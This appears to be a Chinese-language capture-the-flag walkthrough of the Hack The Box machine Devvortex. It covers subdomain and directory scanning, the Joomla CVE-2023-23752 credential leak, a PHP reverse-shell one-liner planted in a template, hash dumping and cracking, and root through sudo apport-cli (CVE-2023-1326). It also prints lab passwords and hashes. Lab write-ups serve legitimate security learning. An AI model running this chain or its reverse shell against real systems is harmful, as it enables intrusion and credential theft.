Devvortex

使用nmap扫描服务器

```
nmap -sV -sC  10.10.11.242
```

![image-20231209202245367](/home/gary/文档/GitHub/note/图片/image-20231209202245367.png)

使用wfuzz进行子域名爆破

```
wfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://devvortex.htb" -H "Host:FUZZ.devvortex.htb"
```

![image-20231209210924605](../图片/image-20231209210924605.png)

爆破出dev的子域名，将子域名加入hosts

使用gobuster对dev.devvortex.htb进行目录扫描

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 200
```

![image-20231210085448057](../图片/image-20231210085448057.png)

扫描出administrator的目录发现登录页面

![image-20231210085547645](../图片/image-20231210085547645.png)

扫描出README.txt，发现joomla版本为4.2

![image-20231210090134052](../图片/image-20231210090134052.png)

发现是joomla cms在网上发现有专门的漏洞扫描工具：joomscan

下载

```
apt install joomscan
```

使用joomscan进行扫描

```
joomscan -url http://dev.devvortex.htb
```

![image-20231210133543870](../图片/image-20231210133543870.png)

扫描出joomla的版本为4.2.6 并且扫描出部分目录

通过搜索joomla 4.2.6版本爆出有未授权访问-CVE-2023-23752漏洞

影响版本

```
4.0.0 <= Joomla <= 4.2.7
```

构造路由 `/api/index.php/v1/config/application?public=true`

返回数据库信息

![image-20231210142738086](../图片/image-20231210142738086.png)



用户名：lewis

密码：P4ntherg0t1n5r3c0n##

使用这个密码在登录页面成功登录后台

![image-20231210143126921](../图片/image-20231210143126921.png)



在页面中写入一句话木马反弹nc

```
system('bash -c "bash -i >& /dev/tcp/10.10.14.75/5566 0>&1"');
```

![image-20231210144551598](../图片/image-20231210144551598.png)

在攻击机监听5566端口

```
nc -lvc 5566
```

访问/templates/cassiopeia/offline.php文件nc反弹成功

![image-20231210152232965](../图片/image-20231210152232965.png)

使用python 生成伪终端实用程序

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

登录mysql

``` 
mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##
```

查询表单

```
show tables;
```

![image-20231210160913734](../图片/image-20231210160913734.png)

查询sd4fg_users表

```
select * form sd4fg_users
```

![image-20231210161403676](../图片/image-20231210161403676.png)



获取到hash值

```
lewis
$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u 
logan
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 
```

使用john进行破解

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

![image-20231210163844177](../图片/image-20231210163844177.png)

爆破出密码：tequieromucho

使用密码ssh登录上去

```
ssh logan@10.10.11.242
```

查看flag 25900af2d9a5e5e8143ee8422e343c27

![image-20231210171626711](../图片/image-20231210171626711.png)

#### 提权

使用sudo -l 查看使用可以用root访问权限运行任何脚本

![file:///tmp/%E6%88%AA%E5%9B%BE_2023-12-10_16-48-18.png](../图片/截图_2023-12-10_16-48-18.png)

发现这个程序可以使用所有权限/usr/bin/apport-cli

搜索apport时发现新爆出漏洞CVE-2023-1326

POC

```
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
输入V
再输入!/bin/bash
```



![image-20231210171105864](../图片/image-20231210171105864.png)

已经提权到root，查看flag 25900af2d9a5e5e8143ee8422e343c27

![image-20231210171217416](../图片/image-20231210171217416.png)

妈的哪个傻逼flag改了 

后补
